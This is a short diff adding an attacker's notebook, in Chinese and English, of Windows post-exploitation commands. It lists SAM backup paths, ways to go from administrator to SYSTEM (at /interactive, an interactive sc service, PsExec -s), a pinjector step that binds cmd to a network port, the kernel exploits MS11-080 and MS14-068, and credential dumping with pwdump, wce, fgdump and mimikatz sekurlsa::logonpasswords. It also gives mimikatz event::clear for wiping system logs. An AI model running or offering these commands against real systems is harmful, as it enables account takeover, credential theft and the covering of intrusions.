@@ -1,0 +1,43 @@
+%SYSTEMROOT%\repair\SAM(SAM备份文件)
+%SYSTEMROOT%\system32\config\regback\SAM
+
+admin to sys:
+1.at 18:12 /interactive cmd	 	
+2.taskngr -> kill explerer.exe
+3.explerer.exe 
+//only win03,xp
+		
+sc Create syscmd binPath="cmd /K start" type=own type=interact
+sc start syscmd
+
+工具:sysinternals suite{
+PsExec -i -s cmd
+}
+
+注入进程提权:
+pinjector.exe -l
+pinjector.exe -p pid cmd port
+
+系统漏洞提权:
+ms11-080
+ms14-068
+
+
+程序配置不当提权；
+查看应用的NTFS权限： 
+icacls c:\windows\*.exe /save perm /T 
+编译：i586-mingw32msvc-gcc -o nc.exe nc.c	apt-get install mingw-w64 -y
+
+
+
+抓密码：
+pwdump.exe
+wce.exe -w
+//注册表里面删除wdigest包可防止wce。
+fgdump.exe
+mimikatz.exe
+(privilege::debug
+sekurlsa::logonpasswords)
+(ts::multirdp)允许多admin登录
+（event::clear）清楚系统日志
+
